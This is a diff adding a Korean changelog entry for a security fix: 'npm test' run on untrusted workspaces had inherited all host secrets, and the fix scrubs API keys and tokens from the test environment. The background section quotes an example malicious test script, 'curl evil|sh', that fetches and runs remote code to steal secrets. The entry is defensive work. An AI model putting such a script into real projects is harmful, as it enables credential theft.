@@ -1,5 +1,23 @@
 # Changelog
 
+## 1.9.299 — 2026-06-04 — UR-0039: npm test 시크릿 노출 차단 (외부 AI 리뷰 #2, Opus S-1)
+
+**🔒 신뢰 못 할 워크스페이스의 `npm test` 가 호스트 `process.env`(시크릿 전체)를 상속받던 실질 취약점 차단. Opus 4.8 리뷰가 코드 라인 근거로 지적한 high 보안 이슈.**
+
+### 배경 (Opus S-1)
+`verify-claim --run-tests`(9475)와 `reuse --run-tests`(10051)가 `cp.spawnSync('npm test', [], { shell:true })` 를 **env 미지정**으로 호출 → 임의 `package.json` `"test"` 스크립트가 호스트의 모든 환경변수(AWS/OPENAI/ANTHROPIC 키, GITHUB_TOKEN, NPM_TOKEN, LEERNESS_NPM_TOKEN 등)에 접근. 악성 워크스페이스의 `"test":"curl evil|sh"` 가 시크릿 전체를 탈취 가능. `runCommandSafe`(cwd jail + `_scrubEnv`)가 있는데도 우회됨. verify-code(14684)는 runCommandSafe 경유였으나 `_scrubEnv` 가 release 토큰을 통과시켜 test 스크립트에 노출.
+
+### 구현 (UR-0039)
+1. **`_scrubTestEnv()` 신설** — `_scrubEnv` 결과에서 시크릿 키까지 제거(`_isSecretKey` 단일출처 재사용). `_scrubEnv` 는 release/publish 호환으로 GITHUB_TOKEN/NPM_TOKEN/GH_TOKEN/LEERNESS_*(LEERNESS_NPM_TOKEN 포함) 통과시키나, 임의 test 스크립트엔 전부 제거. PATH 등 실행 필수 키는 유지.
+2. **`runCommandSafe` `scrubSecrets` 옵션** — true 시 `_scrubTestEnv` 사용(기본은 `_scrubEnv`, release/git 흐름 유지).
+3. **취약 spawn 전환** — verify-claim --run-tests(9475)/reuse --run-tests(10051)를 `cp.spawnSync` → `runCommandSafe(..., { scrubSecrets:true })`. cwd jail + 시크릿 차단 동시 획득. verify-code(14684)에도 `scrubSecrets:true` 추가.
+4. selftest 46→47 (`_scrubEnv` 토큰 유지 vs `_scrubTestEnv` 제거 + PATH 유지) · e2e 243→244 (대조군: 스크럽 없이 직접 실행 시 토큰 노출 exit 1 → verify-code 는 스크럽으로 test 통과).
+
+### 검증
+- **selftest 47/47 PASS** · **E2E 244/244 PASS** (회귀 0).
+- 실측: 토큰이 보이면 exit 1 인 test 스크립트가 verify-code(scrubSecrets) 에선 **통과**(스크럽됨), 직접 npm test(대조군)에선 **exit 1**(노출 확인 — 테스트 자체 유효성 검증).
+- `_scrubEnv` 는 NPM_TOKEN 유지(release publish 정상), `_scrubTestEnv` 는 NPM_TOKEN/LEERNESS_NPM_TOKEN 제거 + PATH 유지.
+
 ## 1.9.298 — 2026-06-04 — UR-0038: writeUtf8 원자적 쓰기 (외부 AI 리뷰 3중수렴 #1)
 
 **🔒 외부 AI 리뷰 3종(Codex gpt-5.5 · Sonnet 4.8 · Opus 4.8)이 공통 high로 지적한 최우선 신뢰성 이슈 해소 — 모든 상태 파일 쓰기를 원자적(temp→rename)으로 전환해 부분쓰기 손상을 근본 차단. "메모리 항상 보존" 약속을 코드로 보증.**
